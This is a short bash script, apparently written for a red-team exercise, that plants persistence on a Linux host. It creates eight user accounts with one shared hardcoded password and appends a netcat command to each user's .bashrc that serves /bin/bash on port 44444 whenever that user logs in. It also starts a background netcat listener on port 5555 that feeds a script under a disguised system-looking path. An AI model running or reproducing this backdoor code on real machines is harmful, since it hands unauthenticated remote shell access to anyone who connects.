#!/bin/bash

usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")

for username in "${usernames[@]}"; do
    # Create red team users
    if id "$username" &>/dev/null; then
        echo "User $username already exists, skipping creation."
    else
        useradd -m -s /bin/bash "$username"
    fi
    # Set passwords for red team users
    echo "$username:aTerg0Lupi!" | chpasswd
    # Spawn reverse shell in each user's bash profile
    touch "/home/$username/.bashrc"
    ip=$(hostname -I | awk '{print $1}')
    echo "nc.traditional -lvnp 44444 -e /bin/bash" &>> "/home/$username/.bashrc"
    chown "$username:$username" "/home/$username/.bashrc"
done

# Listen for messages and display them in terminals - start this in background
nc.traditional -lvnp 5555 | while read line; do
    /etc/System-Clock/chronos-broadcast.sh "$line"
done &